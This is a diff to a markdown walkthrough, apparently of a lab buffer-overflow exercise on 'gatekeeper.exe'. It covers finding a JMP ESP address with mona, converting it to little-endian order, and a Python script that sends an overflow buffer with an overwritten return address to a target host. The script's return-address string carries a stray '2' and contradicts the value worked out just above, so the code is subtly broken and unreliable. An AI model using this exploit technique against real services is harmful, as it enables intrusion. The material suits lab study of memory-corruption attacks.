@@ -415,6 +415,80 @@ payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\
 
     - NOTE: Restart `Immunity Debugger` + `gatekeeper.exe` (`CTRL + F12`)
 
+---
+
+### 4. Finding a Jump Point
+
+- With the `gatekeeper.exe` either **running or in a crashed state**, run the following `mona` command...
+
+    - **Making sure to update the `-cpb` option with all the `badchars` you identified (including `\x00`)**:
+
+        - `!mona jmp -r esp -cpb "\x00\x0A"`
+
+    - This command finds all `JMP ESP` (or equivalent) instructions with addresses that don't contain any of the badchars specified. 
+    
+    - ![image](https://user-images.githubusercontent.com/94720207/169707638-078616e6-e895-45e5-9147-fe5e7583dda5.png)
+    
+    - Other option with the same result is using the command:
+    
+        - `!mona jmp -r esp -m gatekeeper.exe`  
+     
+    - ![image](https://user-images.githubusercontent.com/94720207/169707718-26599070-60be-4358-8bf1-fcf20cf9b601.png)
+
+    - The results should display in the `Log data` window (use the Window menu to switch to it if needed).
+
+    - Choose an address and update your python script with the new `overflow1_step4_findJumpPoint.py` script.
+    
+        - 1st Address/Pointer: `080414C3` 
+    
+        - Set the `retn` variable to the address, written `"special backwards"` (since the system is `little endian`). 
+        
+            - **For example:**
+            
+                - If the address is `\x01\x02\x03\x04` 
+                
+                - in Immunity, write it as `\x04\x03\x02\x01` in your exploit.
+            
+            - **Reversing `little indian`:**
+            
+                - Normal: `080414C3`
+                
+                - Separate Normal: `08 04 14 C3`
+                
+                - Reversed pair: `C3 14 04 08`
+                
+                - Final Result: `"\xC3\x14\x04\x08"` 
+            
+            - **`retn` = `"\xC3\x14\x04\x08"`**     
+
+```python
+import socket
+
+ip = "192.168.1.100"
+port = 31337
+
+prefix = ""
+offset = 146
+overflow = "A" * offset
+retn = "\xC3\x14\x04\x082"
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+
+---
 
 
 
